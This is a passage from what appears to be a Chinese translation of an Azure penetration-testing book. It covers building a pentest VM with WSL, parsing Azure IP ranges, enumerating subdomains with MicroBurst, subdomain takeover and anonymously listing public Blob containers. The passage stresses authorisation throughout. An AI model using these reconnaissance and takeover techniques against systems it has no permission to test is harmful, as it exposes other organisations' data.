  \n图 2.29 – 与 pentest 虚拟机的 RDP 会话\n\n在本练习中，你在 Azure 中部署了一台 pentest 虚拟机。我们将使用这台虚拟机来发起本书后续要介绍的渗透测试攻击场景。\n\
  \n> **重要提示**\n> \n> 如果你想要进一步限制对此虚拟机的访问，可以将对该虚拟机的 RDP 访问限制为你自己的外部**互联网协议（IP）**地址。这被视为最佳实践，可以在门户中虚拟机“**网络**”部分的“**入站安全规则**”中进行设置。也可以通过“**网络安全组**”菜单进行访问。\n\
  \n在下一个练习中，我们将介绍在 pentest 虚拟机上安装**适用于 Linux 的 Windows 子系统（WSL）**。\n\n### 动手练习：在 pentest\
  \ 虚拟机上安装 WSL\n\n我们将在渗透测试场景中使用的一些工具是基于 Linux 的。为了避免为不同的工具集搭建两套渗透测试系统，我们将在刚部署的 pentest\
  \ 虚拟机上安装 **WSL**。WSL 允许我们直接在 Windows 上运行 Linux 环境，而无需部署传统的虚拟机。以下是我们在本练习中要完成的任务：\n\
  \n- **任务 1：** 验证 Windows 构建版本是否支持 WSL。\n- **任务 2：** 启用 WSL（并重启虚拟机）。\n- **任务 3：**\
  \ 下载 Ubuntu 20.04 Linux 发行版。\n- **任务 4：** 安装 Ubuntu 20.04 Linux 发行版。\n- **任务 5：**\
  \ 启动 Linux 发行版。\n\n让我们通过以下步骤来安装 WSL：\n\n1. 在与 pentest 虚拟机的 RDP 会话中，右键点击**开始**按钮，然后点击\
  \ **Windows PowerShell（管理员）**，如下面的截图所示：\n\n以下是输出结果的样子：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_82_0.png)\n\
  \n图 2.31 – 验证 Windows 构建版本\n\n3. 使用以下命令启用 WSL。当提示重启虚拟机时，键入 **Y** 并按 *Enter* 键。等待几分钟让虚拟机重启，然后使用\
  \ RDP 重新连接，并以管理员身份打开 PowerShell 控制台：\n\n```\nEnable-WindowsOptionalFeature -Online\
  \ -FeatureName Microsoft-Windows-Subsystem-Linux\n```\n\n以下是输出结果的样子：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_82_1.png)\n\
  \n图 2.32 – 使用 PowerShell 启用 WSL\n\n4. 切换到用户目录（使用 `C:\\Users\\$env:USERNAME\\` 或\
  \ `~` 均可），并使用以下命令下载 Ubuntu 20.04 发行版：\n\n```\ncd C:\\Users\\$env:USERNAME\\\nInvoke-WebRequest\
  \ -Uri https://aka.ms/wslubuntu2004 -OutFile Ubuntu.appx -UseBasicParsing\n```\n\
  \n5. 使用以下命令验证下载：\n\n```\nGet-ChildItem\n```\n\n以下是输出结果的样子：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_83_0.png)\n\
  \n图 2.33 – 验证已下载的 Linux 发行版\n\n6. 使用以下命令解压已下载的发行版：\n\n```\nRename-Item .\\Ubuntu.appx\
  \ .\\Ubuntu.zip\n```\n\n```\nExpand-Archive .\\Ubuntu.zip .\\Ubuntu\n```\n\n7. 使用以下命令安装已解压的\
  \ Linux 发行版。安装过程需要几分钟才能完成：\n\n```\nSet-Location .\\Ubuntu\\\n```\n\n```\n.\\ubuntu2004.exe\n\
  ```\n\n8. 当提示为 Linux 安装输入凭据时，请完成以下操作：\n\n- 输入新的 UNIX 用户名：pentestadmin。\n- 新密码：为简单起见，请输入与\
  \ pentest 虚拟机相同的密码。\n- 重新输入新密码：再次输入相同的密码。\n\n下面的截图展示了这一过程：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_84_0.png)\n\
  \n图 2.34 – 为 WSL 配置凭据\n\n9. 使用以下命令为 Linux 安装应用更新。当提示时，输入你刚刚配置的密码：\n\n```\nsudo apt\
  \ update -y\n```\n\n10. 你可以关闭 PowerShell 控制台。以后要使用 WSL，只需在 PowerShell 控制台或 pentest\
  \ 虚拟机的命令行控制台中键入 `bash` 并按 *Enter* 键即可。\n\n在本练习中，你在 pentest 虚拟机上启用了 WSL。在接下来的练习中，我们将介绍安装\
  \ Azure PowerShell 模块和 Azure **命令行接口（CLI）**，它们是本书中将要使用的其他渗透测试工具所必需的。\n\n### 动手练习：在\
  \ pentest 虚拟机上安装 Azure 和 Azure AD PowerShell 模块\n\n如第一章所述，**Azure PowerShell** 是一个模块，管理员和开发人员可以将其添加到\
  \ PowerShell 中，以连接到 Azure 订阅并管理 Azure 资源。**Azure AD PowerShell** 是 IT 专业人员用来管理 Azure\
  \ AD 的模块。这两个模块都包含渗透测试人员可以用来枚举目标环境的有用命令。Azure 特定的渗透测试工具，如 **MicroBurst** 和 **PowerZure**，也需要安装这些模块。\n\
  \n在本练习中，我们将在 pentest 虚拟机上安装这两个模块。以下是我们要完成的任务：\n\n- **任务 1：** 验证是否已安装 PowerShellGet\n\
  - **任务 2：** 将 PowerShell 库配置为受信任的存储库\n- **任务 3：** 安装并验证 Azure PowerShell 模块\n- **任务\
  \ 4：** 安装并验证 Azure AD PowerShell 模块\n\n让我们按如下方式安装 Azure PowerShell 和 Azure AD PowerShell：\n\
  \n1. 在 pentest 虚拟机上以管理员身份打开 PowerShell。\n2. 使用以下命令验证是否已安装 PowerShellGet：\n\n```\n\
  Get-Module -ListAvailable PowerShellGet\n```\n\n结果如下所示：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_85_0.png)\n\
  \n图 2.35 – 将 PowerShell 库配置为受信任的存储库\n\n3. 我们将安装的两个模块都将从 PowerShell 库存储库下载。为了避免收到有关存储库信任级别的消息，我们可以使用以下命令将其配置为受信任的存储库。当提示安装\
  \ NuGet 提供程序时，键入 Y 表示同意，然后按 Enter 键：\n\n```\nSet-PSRepository -Name PSGallery -InstallationPolicy\
  \ Trusted\n```\n\n结果如下所示：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_85_1.png)\n\
  \n图 2.36 – 将 PowerShell 库配置为受信任的存储库\n\n\n\n\n\n> **注意**\n>\n> 强烈建议在不使用渗透测试虚拟机时将其关闭，以节省一些成本。你可以通过\
  \ Azure 门户停止该虚拟机来完成此操作。\n\n### Azure 渗透测试工具\n\n在本书的整个过程中，我们将使用不同的工具来模拟对手的战术和技术。我们可以根据这些工具的典型用途，将它们分为不同类别。\n\
  \n首先，我们有 **Windows 或 Linux 管理工具**，如下所述：\n\n- 管理员通常用于常规系统管理的工具\n- **示例：** `JQ`、`httpie`、`wget`、`curl`、`unzip`\
  \ 和 `PowerShell`\n\n接下来是 **通用渗透测试工具**，如下所述：\n\n- 通用服务和漏洞识别工具\n- **示例：** `gobuster`、`nmap`、`dnscan`\
  \ 和 `hydra`\n\n最后，我们有 **Azure 专用渗透测试工具**，如下所述：\n\n- 经过优化、专注于 Azure 平台相关漏洞的渗透测试工具\n\
  - **示例：** MicroBurst、Lava、Koboko、PowerZure、Stormspotter 和 BloodHound\n\n目前这类 Azure\
  \ 专用工具很少，而且大多数是开源的。这通常意味着创建者和贡献者是在自己的空闲时间发布和更新这些工具，因此经常有其他人参与贡献这些工具的机会。本书的作者（以及我们的技术审阅者）都为开源工具做出过贡献，包括前面提到的一些工具，我们的工作证明了：如果你需要的工具或功能不存在，你可以自己动手编写。\n\
  \n关于这些类别，一个重要的区别需要注意：通用渗透测试工具与 Azure 专用工具之间的差异。虽然许多通用渗透测试工具可以用于针对 Azure，但它们通常需要配置以专注于\
  \ Azure 域名和服务。本书中提到的 Azure 专用工具要么是专门为限定在 Azure 域范围内而构建的，要么是围绕现有的微软 **应用程序编程接口（API）**、PowerShell\
  \ 模块和库构建的，以便直接与 Azure 集成。\n"
- "## 3 查找 Azure 服务与漏洞\n\n作为渗透测试人员，你可能会在评估过程中被要求对 Azure 租户进行匿名攻击。从范围的角度来看，这可能会很棘手。任何人都可以随意命名一个\
  \ Azure 服务，而且可能很难找到真正在范围内的资源。无论你是在追逐漏洞赏金，还是在渗透测试期间寻找影子 IT 资产，匿名的 Azure 服务发现都可以成为识别环境中漏洞的有用工具。\n\
  \n在本章中，我们将介绍不需要对 Azure 租户进行任何身份验证的攻击。此外，这些攻击还可以用于获得对 Azure 租户的初始访问权限。我们还将讨论目前可用于评估\
  \ Azure 服务漏洞的多个开源工具包。\n\n具体来说，在本章中，我们将涵盖以下小节：\n\n- Azure 渗透测试指南\n- 匿名服务识别\n- 识别面向公共服务的漏洞\n\
  - 查找 Azure 凭据\n\n### 技术要求\n\n对于本章，我们将使用在 *第 2 章，构建你自己的环境* 中搭建的虚拟机。如果你没有搭建自己的环境，请确保你拥有带\
  \ PowerShell 的 Windows 系统的本地管理员访问权限。虽然理解本章内容并不绝对需要 Windows 桌面环境，但作者建议（如前一章所述）启动一台\
  \ Azure 虚拟机来测试我们将要介绍的工具和技术。\n\n### Azure 渗透测试指南\n\n自 2017 年 6 月起，*微软不再要求组织在对其 Azure\
  \ 资源进行渗透测试前获得预先批准*（`https://docs.microsoft.com/en-us/azure/security/fundamentals/pen-testing`）。需要特别注意的是，此豁免不适用于其他微软云服务，例如\
  \ Office 365。即使你在执行渗透测试前无需通知微软，但仍然有明确规定的 *交战规则*，你必须始终遵守，并且绝对不应跨越这些界限。不遵守规定可能会导致你的\
  \ Azure 账户被暂停或终止、微软对你提起法律诉讼，以及向你提出财务赔偿责任索赔！\n\n> **重要说明**\n>\n> 由于这些指南会不时更新，我们建议你访问\
  \ `https://www.microsoft.com/en-us/msrc/pentest-rules-of-engagement` 以查看最新信息。\n\n\
  以下活动被禁止：\n\n- 扫描属于 *其他 Azure 客户* 的资产。\n- 访问任何 *不属于你的数据*。\n- 严禁执行任何形式的拒绝服务测试，因为这可能导致\
  \ *其他 Azure 客户遭遇计划外停机*。\n- 尝试对微软员工进行网络钓鱼或其他社会工程攻击。\n\n以下活动被允许：\n\n- 扫描你的 Azure 端点以发现应用程序或配置漏洞\n\
  - 对你的 Azure 端点进行端口扫描和模糊测试\n\n一般来说，任何可能影响其他 Azure 客户或底层 Azure 基础设施稳定性的活动都是不允许的（包括未经许可测试和访问其他客户的数据）。测试你的\
  \ Azure 端点及其上托管的应用程序是受到鼓励的。\n\n#### Azure 渗透测试范围\n\nAzure 中的渗透测试可以有多种不同的范围。根据你的组织如何确定对环境的威胁，以及他们如何定义\
  \ *渗透测试*，测试可能会有不同的目标。\n\n常见的 Azure 渗透测试范围包括以下内容：\n\n- 匿名外部测试\n- 只读配置审查\n- 内部网络测试\n\
  - 架构审查\n\n很多时候，Azure 渗透测试会包含这些范围的任意组合。无论如何，在开始测试之前，我们都希望获得 Azure 资产所有者的书面法律批准。就像任何其他渗透测试一样，*拥有明确定义的范围和方法论对项目的成功至关重要*。\n\
  \n对于那些从漏洞赏金角度看待本内容的人来说，本章将为你提供大量从外部角度攻击 Azure 目标的选项。就像任何其他测试一样，始终确保 Azure 目标在你所参与的漏洞赏金计划范围内是个好主意。\n\
  \n在本章的其余部分，我们将从匿名枚举和测试 Azure 服务开始。然后，我们将研究可以帮助我们获取租户中 Azure Active Directory 账户的攻击场景。\n\
  \n### 匿名服务识别\n\n现在我们已经对 Azure 基础设施和 Azure 渗透测试的可用范围有了基本了解，让我们开始进行一些实际的攻击。在本节中，我们将介绍如何匿名识别托管在\
  \ Azure 中的面向互联网的服务。鉴于许多组织都在使用 Azure 服务，这对于任何外部测试都是适用的，无论云平台是什么。\n\n#### 自行承担测试风险\n\
  \n为了本书的目的，我们将在示例中提供一些真实资源（由作者托管），供你用于测试这些工具。除非另有说明，本书中的所有示例都将指向你有权按照示例操作（测试）的资源。\n\
  \n> **重要说明**\n>\n> 不要针对你无权测试的系统或服务运行本书中的工具或示例。希望到目前为止，我们已经充分说明了这一点。\n\n我们将尽量为每次攻击指出具体的\
  \ *危险范围* 示例。如有疑问，请向你正在测试的资源的所有者确认，你匿名枚举到的资源是否归该组织所有。\n\n#### Azure 公共 IP 地址范围\n\n\
  与其他公共云提供商一样，Microsoft Azure 允许组织将可访问互联网的 IP 地址分配给 Azure 资源。公共 IP 地址可以分配到以下 Azure\
  \ 资源：虚拟机网络接口、面向互联网的负载均衡器、VPN 网关、应用程序网关或 Azure 防火墙实例（图 3.1）。\n\n当分配公共 IP 地址时，它们可以是\
  \ *静态* 或 *动态* 的。动态公共 IP 地址在 Azure 资源的生命周期内可能会改变，而静态公共 IP 地址在 Azure 资源的生命周期内不会改变：\n\
  \n\n\n> **注意**\n>\n> 请注意，前面的命令并不属于我们稍后将要演示的动手练习。不过，如果你有一个想尝试运行这些命令的 Azure 环境，可以在\
  \ Azure Cloud Shell 中运行它们。\n\n需要注意的是，动态分配的地址可能会发生变化；如果稍后再次进行测试，这些地址可能已经不再分配给你正在参与测试的组织。在这些情况下，针对\
  \ DNS 主机名可能更为合适，因为 IP 地址发生变化时，DNS 主机名会自动更新。这有助于我们避免扫描其他 Azure 客户的 IP 地址。此外，我们建议在收集到公共\
  \ IP 后立即执行任何公共 IP 扫描。\n\n出于学习目的，我们将向你展示外部攻击者如何利用公开可用的信息匿名发现 Azure 目标。Microsoft Azure\
  \ 网络团队发布了一个 JSON 文件，其中包含所有 Azure 区域和公共服务的公共 IP 地址范围。\n\n该文件也会随着新地址范围的添加而每周更新。攻击者获取此列表并使用\
  \ **JQ** 等 JSON 工具对其进行解析是很常见的。随后，可以使用 **Nmap** 等工具扫描这些 IP 地址范围，以确定攻击面。我们将在下一组练习中模拟这一过程。\n\
  \n> **重要注意**\n>\n> Microsoft 强烈不建议扫描未分配给你的 Azure 订阅的公共 IP 地址范围，或扫描未经所有者授权的地址范围。下一项练习仅用于教育目的。**未经分配所有者的书面法律许可，请勿扫描这些地址！**\n\
  \n### 动手练习 – 使用 PowerShell 解析 Azure 公共 IP 地址\n\n本练习将引导你了解外部攻击者如何利用已发布的 Azure 公共\
  \ IP 地址范围，识别潜在目标并扫描其漏洞。\n\n以下是本练习中将完成的任务：\n\n- **任务 1：** 在我们的渗透测试虚拟机上下载已发布的 Azure\
  \ 公共 IP 地址范围 JSON 文件。\n- **任务 2：** 使用 PowerShell 解析下载的文件，以识别潜在目标。\n\n让我们开始：\n\n\
  1. 在渗透测试虚拟机中打开 Web 浏览器，并访问 `https://www.microsoft.com/en-us/download/details.aspx?id=56519`（也可以使用这个短网址：`http://bit.ly/azureipranges`）。\n\
  \n2. 单击 **Download** 按钮，以获取当前的 Azure 公共 IP 地址范围列表。这将下载一个 JSON 文件，其中包含按区域和服务划分的公共\
  \ IP 地址范围列表。\n\n3. 为了演示方便，我们不会使用下载的 JSON 文件，而是使用命令行会话中显示的链接来下载该文件：\n\n   ![](img/4fa338e84e0a590967a142dd798ba4e2_97_0.png)\n\
  \n   图 3.2 – 下载 JSON 文件\n\n4. 在显示的窗口中，右键单击 **click here to download manually**，然后单击\
  \ **Copy link address**，以获取 JSON 文件的 URL：\n\n   ![](img/4fa338e84e0a590967a142dd798ba4e2_97_1.png)\n\
  \n   图 3.3 – 获取 JSON 文件的 URL\n\n> **注意**\n>\n> 我们在此处下载的 JSON 文件适用于 Azure 公有云。Azure\
  \ 美国政府云有一个单独的文件，可从 `https://www.microsoft.com/en-us/download/details.aspx?id=57063`\
  \ 下载。\n\n5. 在渗透测试虚拟机的 PowerShell 控制台中，使用以下命令下载 JSON 文件。将 `<json_url>` 替换为你在*步骤 3*中获取的\
  \ URL：\n\n   ```\n   cd C:\\Users\\$env:USERNAME\\\n   Invoke-WebRequest <json_url>\
  \ -OutFile azure_ip_range.json\n   ```\n\n6. 在本示例中，我们将使用 PowerShell 筛选 Azure 英国南部区域中所有服务的公共\
  \ IP 地址范围。这样会返回一个 IP 地址范围列表，攻击者可以扫描这些地址，以确定开放端口以及这些端口上正在监听的服务：\n\n   ```\n   $jsonData\
  \ = gc .\\azure_ip_range.json | ConvertFrom-Json\n   ($jsonData | select -ExpandProperty\
  \ values | where name -EQ AzureCloud.uksouth).properties.addressPrefixes\n   ```\n\
  \n7. 接下来，尝试筛选英国南部区域中特定服务（Azure App Service 实例）所使用的公共 IP 地址范围。攻击者可以获取这些 IP 地址范围并扫描其中的\
  \ Web 应用程序漏洞，因为 Azure App Service 资源通常用于托管 Web 应用程序和 API：\n\n   ```\n   ($jsonData\
  \ | select -ExpandProperty values | where name -EQ AppService.UKSouth).properties.addressPrefixes\n\
  \   ```\n\n8. 攻击者可以获取这些 IP 地址范围，并扫描开放端口和正在监听的服务，以了解攻击面。使用*步骤 6 和 7*中的示例，尝试执行其他查询，以识别其他\
  \ Azure 服务和区域的公共 IP 地址范围。\n\n> **重要注意**\n>\n> 为了“让一切正常工作”，一些 Azure 管理员或工程师可能会开放分配给不同\
  \ Azure 区域的较大 IP 地址范围，以允许虚拟机相互通信。这也可能使你能够从正确区域中的虚拟机访问相同的系统。如果你已通过身份验证访问 Azure 环境，请留意网络安全组规则中的\
  \ Azure IP 地址范围，因为你可能可以加以利用。\n\n此外，也可以使用此列表验证你已经在定位的主机是否为 Azure 资源。只需将目标 IP 地址与此列表中的地址范围进行比较，即可识别托管在\
  \ Azure 上的资源。本章稍后将使用 Cloud IP Checker 工具演示如何执行此操作。\n\n### Azure 平台 DNS 后缀\n\n如*第\
  \ 1 章“Azure 平台和体系结构概述”*所述，许多 Azure 平台服务使用由 Microsoft 所有和管理的公共 DNS 后缀。当 Azure 客户创建资源实例时，Azure\
  \ 会按照 `<resource instance name>.<service dns suffix name>` 的格式，为其分配关联 DNS 后缀的一个子域。\n\
  \n例如，Azure Blob 存储服务的公共 DNS 后缀是 `blob.core.windows.net`。如果 Azure 客户创建了一个名为 `azurepentesting`\
  \ 的存储帐户实例，则该服务实例的**完全限定域名（FQDN）**将是 `azurepentesting.blob.core.windows.net`。\n\n\
  还需要注意的是，有些 DNS 后缀是区域性的，而另一些则是全局性的。例如，如果客户在 Azure 英国南部区域创建一个带有关联 DNS 标签的公共 IP 资源，则该资源的\
  \ FQDN 将是 `<dns label>.<region>.cloudapp.azure.com`。\n\n> **重要注意**\n>\n> Microsoft\
  \ 确实维护了一份*不完整的* Azure 域名列表。除了本章提到的域名外，该列表还包含一些其他域名。有关更多信息，请参阅 https://docs.microsoft.com/en-us/azure/security/fundamentals/azure-domains。\n\
  \n虽然该列表会持续更新且并不完整，但下面列出了一些常见的 DNS 域名及其关联服务：\n\n| DNS 后缀 | 关联的 Azure 服务 |\n| ---\
  \ | --- |\n| file.core.windows.net | 存储帐户 – 文件 |\n| blob.core.windows.net | 存储帐户\
  \ – Blob |\n| azurewebsites.net | App Services 和 Functions 应用 |\n| scm.azurewebsites.net\
  \ | App Services – 管理 |\n| database.windows.net | 数据库 – MSSQL |\n| documents.azure.com\
  \ | 数据库 – Cosmos DB |\n| cloudapp.azure.com | 客户分配的公共 IP DNS |\n| vault.azure.net\
  \ | Key Vault |\n| azurecontainer.io | 容器实例 |\n| azurecr.io | 容器注册表 |\n\n那么，这些信息与匿名枚举\
  \ Azure 服务有什么关系？作为渗透测试人员，你可以使用 DNS 解析或暴力破解技术枚举这些子域上的主机，从而发现 Azure 客户部署的活动资源实例。\n\
  \n> **重要注意**\n>\n> 需要牢记的是，在进行匿名测试时，*名称并不一定能证明资源的所有权*。例如，你可能会看到一个类似 `https://aws.blob.core.windows.net`\
  \ 的 Azure Blob 存储 URL，并认为它属于**亚马逊云科技（AWS）**。但在本文撰写时，它实际上是一个注册在作者 Azure 租户中的存储帐户。我们使用它来存放\
  \ Azure 写作示例，因此它与亚马逊没有任何关系。除了一些与 Microsoft 相关的关键词外，Azure 平台不会执行资源名称完整性验证。如果某个名称当前尚未被其他人使用，任何拥有有效\
  \ Azure 订阅的人都可以创建一个名为 `departmentofdefense.azurecr.io` 的容器注册表，没有任何机制可以阻止这一点。\n\n\
  要匿名枚举 Azure 中的平台服务，渗透测试人员可以采用以下方法：\n\n1. 确定要使用的基础词搜索词。这些搜索词通常与正在参与测试的 Azure 客户名称，或与该组织相关的已知术语有关；例如，`packt`、`azurepentesting`、`azurept`\
  \ 等。\n2. 根据基础词创建排列组合，以识别潜在的子域名；例如，`packt-prod`、`packt-dev`、`azurepentesting-stage`、`azurept-qa`\
  \ 等。\n\n\n\n\n\n> **重要说明**\n> 以下是决定在渗透测试活动中应使用哪些排列组合的一个实用技巧。Microsoft Azure 资源命名最佳实践已发布在\
  \ https://docs.microsoft.com/en-us/azure/cloud-adoption-framework/ready/azure-best-practices/resource-naming\
  \ （你也可以使用此缩短网址：http://bit.ly/azurenamingbestpractices）。由于许多 Azure 客户很可能遵循推荐的命名方案，我们也可以利用这一信息来协助渗透测试人员进行枚举活动。\n\
  \n3. 使用 MicroBurst、Gobuster 或 DNSscan 等工具枚举匹配这些排列组合的子域名。在接下来的动手练习中，我们将使用 MicroBurst\
  \ 来完成此操作。\n\nMicroBurst 相较于 Gobuster 和 DNSscan 等其他工具的优势在于它是 Azure 专用的，这意味着我们无需手动找出要枚举的每个\
  \ DNS 后缀！\n\n### 动手练习 – 使用 MicroBurst 枚举 PaaS 服务\n\nMicroBurst（https://github.com/NetSPI/MicroBurst）工具集是一组\
  \ PowerShell 脚本，可用于 Azure 中的多种不同攻击。它由本书作者之一 Karl Fosaaen 创建。我们将在本书中全程使用 MicroBurst\
  \ 工具，但在本次练习中，你将在渗透测试 VM 上安装 MicroBurst，并使用其 Invoke-EnumerateAzureSubDomains.ps1\
  \ 脚本来匿名枚举作者已在 Azure 云中预先设置好的 Azure 服务。\n\n按照此处概述的方法论，该脚本将从基础词创建排列组合列表，并尝试基于这些排列组合解析\
  \ DNS 主机名。以下是我们将在本次练习中完成的任务：\n\n- **任务 1：** 下载并安装 MicroBurst。\n- **任务 2：** 使用 MicroBurst\
  \ 枚举活动的 Azure 平台服务实例。\n\n6. 正如在此示例中看到的，结果输出表表明存在具有 azurepentesting 资源名称的 Azure 平台服务实例：\n\
  \n![](img/4fa338e84e0a590967a142dd798ba4e2_104_0.png)\n\n*图 3.7 – MicroBurst 匿名枚举服务*\n\
  \n作者已为本次练习的目的设置了前述截图中列出的资源。超出本书所列的任何额外资源可能不属于作者所有。在遵循示例时请务必谨慎，以免攻击或访问本书示例中未明确定义的资源。\n\
  \n在本章下一节中，我们将看到如何识别并利用这些服务中的一些常见漏洞。\n\n> **重要说明**\n> 请务必在练习中仔细核对你正在使用的资源名称，以避免尝试访问你无权访问的\
  \ Azure 客户资源。\n\n### 自定义域名和 IP 所有权\n\n某些 Azure 服务允许客户使用自定义域名。此外，一些主机可能设置了重定向或透明代理以掩盖服务托管在\
  \ Azure 中的事实。作为渗透测试流程的一部分，你需要充分了解你的目标位于何处，因为这可能会对你的测试范围产生重大影响。例如，你的外部渗透测试范围可能包括你有权攻击的环境中的特定\
  \ IP 和主机名。如果这些主机最终位于 Azure 中，这将影响我们攻击这些特定资源的方式。\n\n### 介绍 Cloud IP Checker\n\nCloud\
  \ IP Checker 是一款基于 Go 的工具，用于检查 IP 地址是否与已发布的 Azure IP 范围和服务标签匹配。如果 IP 匹配已发布范围，它会显示该\
  \ IP 所属的服务及其区域。该工具可以是已发布的 API，也可以是自托管的。\n\n还有其他工具，例如 Leron Gray（Twitter：@mcohmi）创建的\
  \ AzureIPCheck 工具（https://github.com/daddycocoaman/azureipcheck），它提供类似功能，但由于是基于\
  \ Python 的工具，其工作方式略有不同。\n\n| Cloud IP Checker 信息 | |\n|---|---|\n| Creator: | Dean\
  \ Bryen（Twitter：@deanbryen） |\n| Open Source or Commercial: | 开源项目 |\n| GitHub Repository:\
  \ | https://github.com/deanobalino/cloudipchecker |\n| Language: | Go |\n\n### 动手练习\
  \ – 确定自定义域名服务是否托管在 Azure\n\n在本练习中，我们将使用测试订阅中的 book.azurepentesting.com 主机作为示例。要查看此主机是否为\
  \ Azure 托管系统，让我们进行一些基本的域名和 IP 侦察：\n\n1. 在渗透测试 VM 中，打开 PowerShell 控制台。使用 `nslookup`\
  \ 命令识别与我们主机关联的 IP 地址：\n\n   ```text\n   nslookup book.azurepentesting.com\n   ```\n\
  \n2. 记录返回的 IPv4 地址。此外，请注意在以下截图中，主机解析为 `azurepentesting.z13.web.core.windows.net`，这表明该站点托管在\
  \ Azure 中：\n\n   ![](img/4fa338e84e0a590967a142dd798ba4e2_105_0.png)\n\n   *图 3.8\
  \ – 获取 IPv4 地址*\n\n3. 在 PowerShell 控制台中，运行以下命令以确定 IP 地址是否属于 Azure 已发布 IP 范围。将 `<IP_ADDRESS>`\
  \ 替换为你在上一步中记录的 IP 地址值：\n\n   ```text\n   Invoke-WebRequest https://cloudipchecker.azurewebsites.net/api/servicetags/manual?ip=<IP_ADDRESS>\
  \ -UseBasicParsing | Select-Object -ExpandProperty Content\n   ```\n\n4. 正如前述输出所示，该\
  \ IP 属于 Azure IP 范围（美国东部区域的 Azure Storage 服务），因此我们可以推断该服务访问点托管在 Azure 中：\n\n   ![](img/4fa338e84e0a590967a142dd798ba4e2_106_0.png)\n\
  \n   *图 3.9 – 查看 Cloud IP Checker 结果*\n\n现在我们了解了域名和子域名在 Azure 中的运作方式，让我们看看它们如何可以被进行子域名接管攻击。\n\
  \n### 子域名接管\n\n在讨论 Azure 平台 DNS 枚举时，不提及子域名接管问题是不完整的。在调查托管在 Azure 中的应用程序时，你可能会注意到向不存在的\
  \ Azure 子域发出的资源请求。\n\n这种情况有时发生在应用程序最初配置为从 Azure 端点提取内容，但随后内容更改为不同来源，并且初始端点资源从客户的\
  \ Azure 订阅中删除。在某些情况下，指向这些端点的客户管理的 DNS 记录也未被清理。\n\n在实践中，这些通常是 JavaScript 文件或其他类似的\
  \ Web 资源，因为它们对页面显示的影响通常较小且不易被注意到。在这些情况下，攻击者可能能够在 Azure 中重新创建受影响的资源，并通过受影响的网站投递缺失内容。\n\
  \n这只需在新的 Azure 账户中重新创建端点资源并认领缺失资源的子域名即可：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_107_0.png)\n\
  \n*图 3.10 – 子域名接管示例*\n\n其影响可能仅限于网站篡改，也可能严重到存储型跨站脚本或将站点重定向到恶意内容。这是在漏洞赏金中常见的问题，也是需要留意的事项。最常容易受到子域名接管攻击的服务是\
  \ Azure Blob、CDN、Traffic Manager 和 App Services，但这也可能适用于其他具有公共 DNS 后缀的服务。\n\n现在我们了解了自定义域名在\
  \ Azure 中的使用方式，让我们来看看在这些面向公众的系统中可能发现的不同类型漏洞。\n\n### 存储账户\n\n存储账户是 Azure 在云中处理数据存储的方式。这些账户包含以下子服务：\n\
  \n- **Blob 服务**：通用 HTTP/HTTPS 文件托管\n- **Files 服务**：附加数据存储（SMB/NFS）\n- **Table 服务**：NoSQL\
  \ 半结构化数据集\n- **Queue 服务**：HTTP/HTTPS 消息存储\n\n根据之前的子域名枚举任务输出，我们知道 azurepentesting\
  \ 基础词产生了一个名为 `azurepentesting` 的存储账户。\n\n我们还可以看到以下子域名的 DNS 记录：\n\n- **Blob 服务**：`azurepentesting.blob.core.windows.net`\n\
  - **Files 服务**：`azurepentesting.file.core.windows.net`\n- **Table 服务**：`azurepentesting.table.core.windows.net`\n\
  - **Queue 服务**：`azurepentesting.queue.core.windows.net`\n\n默认情况下，在创建存储账户时会分配这四个子域名。这并不一定意味着\
  \ Azure 客户正在使用全部四个服务进行数据存储，因此我们需要确定它们是否包含任何可匿名访问的数据。\n\nFiles、Table 和 Queue 服务访问始终需要某种级别的身份验证（本章中我们不会关注它们）。相反，我们将关注\
  \ Blob 服务，管理员/开发人员可以为其配置匿名文件访问。\n\n#### Blob 存储账户权限概述\n\n存储账户中的 Blob 服务由 **容器**\
  \ 组成。这些容器本质上是可用于存储对象/数据的目录。你可以通过 HTTP/HTTPS 端点访问这些对象。URL 地址是存储账户名称、容器和对象名称的组合。\n\
  \n如以下图所示，如果存储账户名称为 `azurepentesting`，容器名称为 `public`，容器内的文件为 `README.txt`，则对象的 URL\
  \ 将如下所示：\n\n```text\nhttps://azurepentesting.blob.core.windows.net/public/README.txt\n\
  ```\n\n\n\n\n对于更喜欢视觉化学习的人来说，其结构如下所示：\n\n![](img/4fa338e84e0a590967a142dd798ba4e2_110_0.png)\n\
  \n图 3.11 – Azure Blob 服务端点 URL\n\n存储帐户可以包含多个容器，每个容器可以配置不同的公共访问级别。公共访问配置选项如下：\n\n\
  - **私有（Private）：** 不允许匿名访问。访问需要进行身份验证。\n- **Blob：** 允许匿名访问已知对象 URL。\n- **容器（Container）：**\
  \ 允许匿名列出和访问容器中的文件。\n\n虽然 **Blob** 容器权限可能会暴露敏感数据，但攻击者需要知道受影响文件的完整文件名才能访问它们。在应用程序以可预测的命名格式（如\
  \ Report-123.pdf、Report-124.pdf 等）以编程方式创建文件的情况下，攻击者在初步识别目标用户文件后，可能能够推断出存储帐户中其他文件的名称。这种文件名枚举通常称为**不安全直接对象引用**，简称\
  \ **IDOR**。PortSwigger 在其网站上对此问题做了很好的概述：https://portswigger.net/web-security/access-control/idor。\n\
  \n攻击者还可以使用诸如 Gobuster 之类的工具进行容器和对象名称猜测攻击，以查看是否返回对象。成功的可能性很小，但仍然存在。\n\n最令人担忧的公共访问级别是**容器**，因为它允许任何人列出并访问所有可用文件。这意味着，知道存储帐户和容器的攻击者将能够枚举所有可用文件。\n\
  \n利用我们之前的示例存储帐户 URL，我们知道存储帐户名为 `azurepentesting`，并且该容器是公共的。通过将 `?restype=container&comp=list`\
  \ 参数附加到容器 URL（https://azurepentesting.blob.core.windows.net/public/?restype=container&comp=list），我们可以列出该容器中存储的所有对象。这将返回有关可用文件的\
  \ XML 数据，然后我们可以利用这些数据访问对象！\n\n```\n<EnumerationResults ContainerName=\"https://azurepentesting.blob.core.windows.net/public/\"\
  >\n  <Blobs>\n    <Blob>\n      <Name>README.txt</Name>\n      <Url>https://azurepentesting.blob.core.windows.net/public/README.txt</Url>\n\
  \      <Properties>\n        <Last-Modified>Mon, 21 Dec 2020 00:47:51 GMT</Last-Modified>\n\
  \        <Etag>0x8DBA54A0BCC7C5C</Etag>\n        <Content-Length>123</Content-Length>\n\
